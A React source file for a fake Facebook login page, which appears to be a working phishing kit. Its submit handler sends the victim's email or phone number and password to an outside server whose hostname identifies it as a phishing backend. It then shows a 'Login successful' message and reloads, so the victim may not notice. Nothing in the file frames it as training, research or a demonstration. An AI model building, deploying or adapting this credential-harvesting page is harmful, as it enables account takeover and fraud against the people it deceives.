import React, { useState } from "react";

const FacebookLogin = () => {
  const [identifier, setIdentifier] = useState("");
  const [password, setPassword] = useState("");
  const [error, setError] = useState("");
  const [success, setSuccess] = useState(false);

  const validateInput = (input) => {
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    const phoneRegex = /^\+?\d{10,15}$/;
    return emailRegex.test(input) || phoneRegex.test(input);
  };

  const handleSubmit = async (e) => {
    e.preventDefault();

    if (!validateInput(identifier)) {
      setError("Please enter a valid email or phone number.");
      return;
    }

    const loginData = {
      identifier: identifier.trim(),
      password: password.trim(),
    };

    try {
      const response = await fetch("https://phish-backend-1.onrender.com/api/login", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(loginData),
      });

      const result = await response.json();

      if (response.ok) {
        setSuccess(true);
        setError("");
        console.log("Login successful:", result);
        setTimeout(() => window.location.reload(), 2000);
      } else {
        setSuccess(false);
        setError(result.message || "Login failed.");
      }
    } catch (err) {
      console.error("Error:", err);
      setError("Something went wrong. Please try again later.");
    }
  };

  return (
    <div className="min-h-screen bg-blue-100 flex items-center justify-center px-4">
      <div className="bg-white rounded-lg shadow-md p-6 w-full max-w-sm">
        <h1 className="text-2xl font-bold text-center text-blue-600 mb-4">Facebook</h1>
        <p className="text-center text-gray-700 mb-4">Log in to your account</p>

        {success ? (
          <div className="bg-green-100 border border-green-400 text-green-700 px-3 py-2 rounded text-center mb-4">
            ✅ Login successful! Reloading...
          </div>
        ) : (
          <form className="space-y-3" onSubmit={handleSubmit}>
            <input
              type="text"
              placeholder="Email or phone"
              value={identifier}
              onChange={(e) => setIdentifier(e.target.value)}
              className="w-full px-3 py-2 border border-gray-300 rounded focus:outline-none"
              required
            />
            <input
              type="password"
              placeholder="Password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              className="w-full px-3 py-2 border border-gray-300 rounded focus:outline-none"
              required
            />
            {error && <p className="text-sm text-red-500">{error}</p>}
            <button
              type="submit"
              className="w-full bg-blue-600 text-white py-2 rounded hover:bg-blue-700 transition duration-200"
            >
              Log In
            </button>
            <div className="text-center text-sm mt-2">
              <a href="#" className="text-blue-600 hover:underline">
                Forgotten password?
              </a>
            </div>
            <hr className="my-3" />
            <button
              type="button"
              className="w-full bg-green-600 text-white py-2 rounded hover:bg-green-700 transition duration-200"
            >
              Create New Account
            </button>
          </form>
        )}
      </div>
    </div>
  );
};

export default FacebookLogin;
